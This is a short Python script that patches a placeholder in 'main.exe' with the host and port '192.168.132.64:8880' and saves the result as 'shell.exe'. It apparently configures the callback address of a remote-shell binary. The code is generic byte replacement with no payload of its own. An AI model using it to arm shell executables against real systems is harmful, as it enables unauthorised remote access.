def replace_string_in_binary(file_path, old_string, new_string):
    # Calculate the number of spaces needed to make the new string the same length as the old one
    num_spaces = len(old_string) - len(new_string)

    # If the new string is shorter than the old one, append spaces to the end of it
    if num_spaces > 0:
        new_string += ' ' * num_spaces
    elif num_spaces < 0:
        raise ValueError("The new string is longer than the old one.")

    with open(file_path, "rb") as file:
        content = file.read()

    content = content.replace(old_string.encode(), new_string.encode())

    with open("shell.exe", "wb") as file:
        file.write(content)

# Use the function
replace_string_in_binary("main.exe", "HostAAAABBBBCCCCDDDD", "192.168.132.64:8880")
